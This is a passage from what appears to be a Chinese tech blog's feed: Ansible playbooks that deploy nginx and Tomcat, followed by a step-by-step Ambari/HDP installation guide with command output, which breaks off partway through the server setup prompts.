class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;- name: copy nginx package&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  copy: src=nginx-1.10.0-1.el7.ngx.x86_64.rpm dest=/tmp/nginx-1.10.0-1.el7.ngx.x86_64.rpm&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;- name: install nginx package&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  yum: name=/tmp/nginx-1.10.0-1.el7.ngx.x86_64.rpm  state=present&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;- name: install nginx.conf file&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  template: src=nginx.conf.j2 dest=/etc/nginx/nginx.conf&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  tags: ngxconf&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  notify: reload nginx service&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;- name: install default.conf file&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  template: src=default.conf.j2 dest=/etc/nginx/conf.d/default.conf&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  tags: ngxconf&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  notify: reload nginx service&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;- name: start nginx service&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  service: name=nginx enabled=&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt; state=started&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;自动化部署Tomcat服务。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;---&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;- hosts: all&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  environment:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;     LC_ALL: zh_CN.UTF-8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;     LANG : zh_CN.UTF-8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  vars:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#jenkins-打包目录&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    TESTWAR: /root/java_war/haozhuo-family.war&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#生产环境中项目的tomcat所在的位置&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    OLDHOME: /srv/tomcat/tomcat_family/webapps/ROOT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#生产环境中老版本项目所在webapps备份目录的位置&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    backupwebapps: /srv/tomcat/tomcat_family/warbackup&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#从jenkins-打包环境获取的新版本war包所在的位置&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    NEWWAR: /root/java_war/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#生产环境中项目war包的名字&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    WARNAME: haozhuo-family.war&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#kill服务type路径&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DOWNFILE: /srv/tomcat/tomcat_family&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  tasks:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: copy-war-file&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    copy: src=&amp;#123;&amp;#123; TESTWAR &amp;#125;&amp;#125; dest=&amp;#123;&amp;#123; NEWWAR &amp;#125;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: mkdir-bakwar-file&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    file: path=&amp;#123;&amp;#123; backupwebapps &amp;#125;&amp;#125; state=directory owner=tomcat group=tomcat mode=755&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: bakwar-file&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    shell: &lt;span class=&quot;string&quot;&gt;&quot;cp -r &amp;#123;&amp;#123; OLDHOME &amp;#125;&amp;#125; &amp;#123;&amp;#123; backupwebapps &amp;#125;&amp;#125;&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: unzip war.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    unarchive: src=&amp;#123;&amp;#123; NEWWAR &amp;#125;&amp;#125;/&amp;#123;&amp;#123; WARNAME &amp;#125;&amp;#125; dest=&amp;#123;&amp;#123; OLDHOME &amp;#125;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: stop-tomcat-service&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    shell: &lt;span class=&quot;string&quot;&gt;&quot;ps -ef |grep &amp;#123;&amp;#123; DOWNFILE &amp;#125;&amp;#125; |grep -v grep |awk &#39;&amp;#123;print &lt;span class=&quot;variable&quot;&gt;$2&lt;/span&gt;&amp;#125;&#39; |xargs kill -9&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ignore_errors: yes&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    async: 0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: start-tomcat-service-nohup&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    shell: &lt;span class=&quot;built_in&quot;&gt;chdir&lt;/span&gt;=&amp;#123;&amp;#123; DOWNFILE &amp;#125;&amp;#125;/bin nohup ./startup.sh &amp;amp;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Ansible-官网学习：&quot;&gt;&lt;a href=&quot;#Ansible-官网学习：&quot; class=&quot;headerlink&quot; title=&quot;Ansible 官网学习：&quot;&gt;&lt;/a&gt;Ansible 官网学习：&lt;/h3&gt;&lt;p&gt;免费下载的ANSIBLE WHITEPAPER  &lt;
    
    </summary>
    
      <category term="automation" scheme="http://blog.yangcvo.me/categories/automation/"/>
    
    
      <category term="Ansible" scheme="http://blog.yangcvo.me/tags/Ansible/"/>
    
      <category term="Automation" scheme="http://blog.yangcvo.me/tags/Automation/"/>
    
  </entry>
  
  <entry>
    <title>HORTONW0RKS数据平台实现搭建Ambari配置和部署HDP集群监控Hadoop集群</title>
    <link href="http://blog.yangcvo.me/2017/02/08/%E5%A4%A7%E6%95%B0%E6%8D%AEhadoop/HORTONW0RKS%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E5%AE%9E%E7%8E%B0%E6%90%AD%E5%BB%BAAmbari%E9%85%8D%E7%BD%AE%E5%92%8C%E9%83%A8%E7%BD%B2HDP%E9%9B%86%E7%BE%A4%E7%9B%91%E6%8E%A7Hadoop%E9%9B%86%E7%BE%A4%20/"/>
    <id>http://blog.yangcvo.me/2017/02/08/大数据hadoop/HORTONW0RKS数据平台实现搭建Ambari配置和部署HDP集群监控Hadoop集群 /</id>
    <published>2017-02-08T09:56:03.000Z</published>
    <updated>2017-03-28T09:42:31.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;HORTONW0RKS数据平台搭建Ambari管理监控Hadoop集群&quot;&gt;&lt;a href=&quot;#HORTONW0RKS数据平台搭建Ambari管理监控Hadoop集群&quot; class=&quot;headerlink&quot; title=&quot;HORTONW0RKS数据平台搭建Ambari管理监控Hadoop集群&quot;&gt;&lt;/a&gt;HORTONW0RKS数据平台搭建Ambari管理监控Hadoop集群&lt;/h2&gt;&lt;p&gt;&lt;strong&gt; 题外话 &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我现在在一家上市公司旗下控股子公司负责运维部门，负责IT网络安全办公：主要做的应用运维和网络运维，兼大数据运维。&lt;br&gt;最近跟新来的架构师聊了下Hadoop监控方面：HORTONW0RKS数据平台搭建Ambari监控Hadoop集群.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;HORTONW0RKS数据平台（HDP ®）&lt;/strong&gt;&lt;br&gt;HDP是业内唯一真正安全的企业级开源的&lt;code&gt;Apache的Hadoop™ ®&lt;/code&gt;分配基于集中式架构。HDP解决了静态数据的完整需求，为实时客户应用提供支持，并提供可加速决策和创新的可靠分析。&lt;/p&gt;
&lt;p&gt;使用Hortonworks Sandbox试用最新的HDP功能，或者为生产环境设置HDP，安装和配置群集。&lt;br&gt;查看官网文档：&lt;a href=&quot;https://hortonworks.com/downloads/#data-platform&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;HORTONWORKS CONNECTED DATA PLATFORMS DOWNLOADS&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;1-将Ambari服务存储库文件下载到安装主机上的目录。&quot;&gt;&lt;a href=&quot;#1-将Ambari服务存储库文件下载到安装主机上的目录。&quot; class=&quot;headerlink&quot; title=&quot;1. 将Ambari服务存储库文件下载到安装主机上的目录。&quot;&gt;&lt;/a&gt;1. 将Ambari服务存储库文件下载到安装主机上的目录。&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Centos6.5 &lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;wget -nv http://public-repo-1.hortonworks.com/ambari/centos6/2.x/updates/2.4.2.0/ambari.repo -O /etc/yum.repos.d/ambari.repo&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;⚠️警告：不要修改&lt;code&gt;ambari.repo&lt;/code&gt;文件名。在代理注册期间，此文件应在Ambari服务器主机上可用。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过检查repo列表确认存储库已配置。&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;yum repolist&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;您应该在列表中看到类似于以下Ambari存储库的值。&lt;/p&gt;
&lt;p&gt;版本值因安装而异。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;安装Ambari服务。这也安装了默认的PostgreSQL Ambari数据库。&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;yum install ambari-server&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输入&lt;code&gt;y&lt;/code&gt;提示，以确认交易和依赖性检查时。&lt;/p&gt;
&lt;p&gt;成功安装将显示类似于以下内容的输出：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;安装：postgresql-libs-8.4.20-3.el6_6.x86_64 1/4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;安装：postgresql-8.4.20-3.el6_6.x86_64 2/4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;安装：postgresql-server-8.4.20-3.el6_6.x86_64 3/4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;安装：ambari-server-2.4.2.0-1470.x86_64 4/4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;验证：ambari-server-2.4.2.0-1470.x86_64 1/4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;验证：postgresql-8.4.20-3.el6_6.x86_64 2/4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;验证：postgresql-server-8.4.20-3.el6_6.x86_64 3/4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;验证：postgresql-libs-8.4.20-3.el6_6.x86_64 4/4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;安装：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  ambari-server.x86_64 0：2.4.2.0-1470  安装这里的时候会有点慢，因为是访问国外网站下载资源。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;已安装依赖关系：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; postgresql.x86_64 0：8.4.20-3.el6_6           &lt;/div&gt;&lt;div class=&quot;line&quot;&gt; postgresql-libs.x86_64 0：8.4.20-3.el6_6        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt; postgresql-server.x86_64 0：8.4.20-3.el6_6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;❗️❗️【注意】&lt;/p&gt;
&lt;p&gt;接受有关信任&lt;code&gt;Hortonworks GPG&lt;/code&gt;密钥的警告。该键将自动下载并用于验证Hortonworks的软​​件包。您将看到以下消息：&lt;/p&gt;
&lt;p&gt;Importing GPG key 0x07513CAD: Userid: “Jenkins (HDP Builds) &lt;a href=&quot;&amp;#109;&amp;#x61;&amp;#105;&amp;#108;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#x6a;&amp;#x65;&amp;#110;&amp;#x6b;&amp;#x69;&amp;#110;&amp;#64;&amp;#104;&amp;#111;&amp;#114;&amp;#116;&amp;#111;&amp;#110;&amp;#119;&amp;#111;&amp;#114;&amp;#107;&amp;#x73;&amp;#46;&amp;#99;&amp;#111;&amp;#x6d;&quot;&gt;&amp;#x6a;&amp;#x65;&amp;#110;&amp;#x6b;&amp;#x69;&amp;#110;&amp;#64;&amp;#104;&amp;#111;&amp;#114;&amp;#116;&amp;#111;&amp;#110;&amp;#119;&amp;#111;&amp;#114;&amp;#107;&amp;#x73;&amp;#46;&amp;#99;&amp;#111;&amp;#x6d;&lt;/a&gt;“ From :&lt;code&gt;http://s3.amazonaws.com/dev.hortonworks.com/ambari/centos6/RPM-GPG-KEY/RPM-GPG-KEY-Jenkins&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;❗️❗️【注意】&lt;/p&gt;
&lt;p&gt;在具有有限Internet访问或没有Internet访问的群集上部署HDP时，应使用其他方法提供对位的访问。&lt;br&gt;有关设置本地存储库的详细信息，请参阅使用本地存储库。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Ambari&lt;/code&gt;服务器默认使用嵌入式&lt;code&gt;PostgreSQL&lt;/code&gt;数据库。当您安装&lt;code&gt;Ambari&lt;/code&gt;服务器时，PostgreSQL软件包和依赖关系必须可用于安装。这些包通常作为操作系统存储库的一部分提供。请确认您具有适用于&lt;code&gt;postgresql-server&lt;/code&gt;软件包的相应存储库。&lt;/p&gt;
&lt;h3 id=&quot;2-设置Ambari服务器&quot;&gt;&lt;a href=&quot;#2-设置Ambari服务器&quot; class=&quot;headerlink&quot; title=&quot;2.设置Ambari服务器&quot;&gt;&lt;/a&gt;2.设置Ambari服务器&lt;/h3&gt;&lt;p&gt;在启动&lt;code&gt;Ambari&lt;/code&gt;服务器之前，必须设置Ambari服务器。安装程序将Ambari配置为与Ambari数据库通信，安装JDK并允许您自定义Ambari Server守护程序将作为运行的用户帐户。该 &lt;code&gt;ambari-server setup&lt;/code&gt;命令管理设置过程。在Ambari服务器主机上运行以下命令以开始设置过程。您还可以将“ 设置选项”附加到命令。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;启动服务&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;62&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;ambari-server setup&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;###这里由于下载jdk1.8太慢速度过慢。我提前把jdk下载下来放到了/srv/jdk1.8.0_66 目录&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ambari-server_01 ~]&lt;span class=&quot;comment&quot;&gt;# ambari-server setup&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Using python  /usr/bin/python&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Setup ambari-server&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Checking SELinux...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;SELinux status is &lt;span class=&quot;string&quot;&gt;&#39;enabled&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;SELinux mode is &lt;span class=&quot;string&quot;&gt;&#39;permissive&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;WARNING: SELinux is &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; to &lt;span class=&quot;string&quot;&gt;&#39;permissive&#39;&lt;/span&gt; mode and temporarily disabled.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;OK to &lt;span class=&quot;built_in&quot;&gt;continue&lt;/span&gt; [y/n] (y)? y&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Customize user account &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; ambari-server daemon [y/n] (n)? y&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Enter user account &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; ambari-server daemon (root):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Adjusting ambari-server permissions and ownership...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Checking firewall status...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Checking JDK...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[1] Oracle JDK 1.8 + Java Cryptography Extension (JCE) Policy Files 8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[2] Oracle JDK 1.7 + Java Cryptography Extension (JCE) Policy Files 7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[3] Custom JDK&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;==============================================================================&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Enter choice (1): 3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;WARNING: JDK must be installed on all hosts and JAVA_HOME must be valid on all hosts.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;WARNING: JCE Policy files are required &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; configuring Kerberos security. If you plan to use Kerberos,please make sure JCE Unlimited Strength Jurisdiction Policy Files are valid on all hosts.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Path to JAVA_HOME: /srv/jdk1.8.0_66&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Validating JDK on Ambari Server...done.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Completing setup...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Configuring database...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Enter advanced database configuration [y/n] (n)? y&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Configuring database...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;==============================================================================&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Choose one of the following options:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[1] - PostgreSQL (Embedded)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[2] - Oracle&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[3] - MySQL / MariaDB&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[4] - PostgreSQL&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[5] - Microsoft SQL Server (Tech Preview)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[6] - SQL Anywhere&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[7] - BDB&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;==============================================================================&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Enter choice (1):3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Database name (ambari):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Postgres schema (ambari):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Username (ambari):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Enter Database Password 